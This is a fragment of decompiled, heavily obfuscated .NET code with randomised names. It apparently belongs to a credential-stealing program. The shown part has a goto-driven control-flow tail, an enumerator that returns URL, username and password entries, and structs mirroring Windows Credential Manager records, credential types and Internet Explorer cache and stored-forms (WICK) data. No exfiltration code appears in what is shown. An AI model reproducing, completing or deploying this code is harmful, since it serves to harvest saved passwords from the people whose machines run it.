              goto label_50;
            case 61:
              goto label_51;
            case 62:
              goto label_52;
            case 63:
              goto label_53;
            case 64:
            case 66:
              goto label_54;
            case 67:
              goto label_55;
            case 68:
              goto label_56;
            case 69:
              goto label_57;
            case 70:
              goto label_58;
            case 71:
            case 74:
            case 75:
            case 76:
              goto label_61;
            case 72:
              goto label_59;
            case 73:
              goto label_60;
            case 77:
              goto label_62;
            case 78:
              goto label_64;
            case 79:
            case 80:
              goto label_65;
            case 81:
              goto label_72;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_67;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_72:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  public IEnumerator GetEnumerator()
  {
    this.Reset();
    return (IEnumerator) this;
  }

  public void Reset()
  {
    this.O2NjsHuJ35();
    this.MvY5HXAo4 = 0;
  }

  public object Current
  {
    get
    {
      \u0036BoyxwvfeC67NtvmNE8ot5 current = new \u0036BoyxwvfeC67NtvmNE8ot5();
      int mvY5HxAo4 = this.MvY5HXAo4;
      current.Wq59g2Zldzlpkuilu6Xow3(ref this.slu585yj3[mvY5HxAo4].strURL, ref this.slu585yj3[mvY5HxAo4].strUserName, ref this.slu585yj3[mvY5HxAo4].strPassword);
      checked { ++this.MvY5HXAo4; }
      return (object) current;
    }
  }

  public bool MoveNext() => this.slu585yj3 != null && this.MvY5HXAo4 < this.slu585yj3.Length;

  private struct \u0030yYvOlOV14
  {
    public int dwFlags;
    public int dwType;
    public int lpstrTargetName;
    public int lpstrComment;
    public pOeFwFRrxRcQNvQPXDE6Y6.\u0036qyCN6DV7 ftLastWritten;
    public int dwCredentialBlobSize;
    public int lpbCredentialBlob;
    public int dwPersist;
    public int dwAttributeCount;
    public int lpAttributes;
    public int lpstrTargetAlias;
    public int lpUserName;
  }

  private struct \u0036qyCN6DV7
  {
    public int dwLowDateTime;
    public int dwHighDateTime;
  }

  private struct \u0036Ue62oUR13
  {
    public int lpstrKeyword;
    public int dwFlags;
    public int dwValueSize;
    public int lpbValue;
  }

  private struct Dhhh6WEQ10
  {
    public int dwWICK;
    public int dwStructSize;
    public int dwEntriesCount;
    public int dwUnkId;
    public int dwType;
    public int dwUnk;
  }

  private struct ElYYGmVY15
  {
    public string strUserName;
    public string strPassword;
    public string strURL;
  }

  private enum IzePT8WT12
  {
    GENERIC = 1,
    DOMAIN_PASSWORD = 2,
    DOMAIN_CERTIFICATE = 3,
    DOMAIN_VISIBLE_PASSWORD = 4,
    MAXIMUM = 5,
  }

  private struct QAVcufqZ9
  {
    public int cbData;
    public int pbData;
  }

  private struct RicqnSo48
  {
    public int dwStructSize;
    public int lpszSourceUrlName;
    public int lpszLocalFileName;
    public int CacheEntryType;
    public int dwUseCount;
    public int dwHitRate;
    public int dwSizeLow;
    public int dwSizeHigh;
    public pOeFwFRrxRcQNvQPXDE6Y6.\u0036qyCN6DV7 LastModifiedTime;
    public pOeFwFRrxRcQNvQPXDE6Y6.\u0036qyCN6DV7 ExpireTime;
    public pOeFwFRrxRcQNvQPXDE6Y6.\u0036qyCN6DV7 LastAccessTime;
    public pOeFwFRrxRcQNvQPXDE6Y6.\u0036qyCN6DV7 LastSyncTime;
    public int lpHeaderInfo;
    public int dwHeaderInfoSize;
    public int lpszFileExtension;
    public int dwExemptDelta;
  }

  private struct rpc18SWl11
  {
    public int dwDataOffset;
    public pOeFwFRrxRcQNvQPXDE6Y6.\u0036qyCN6DV7 ftInsertDateTime;
    public int dwDataSize;
  }
}
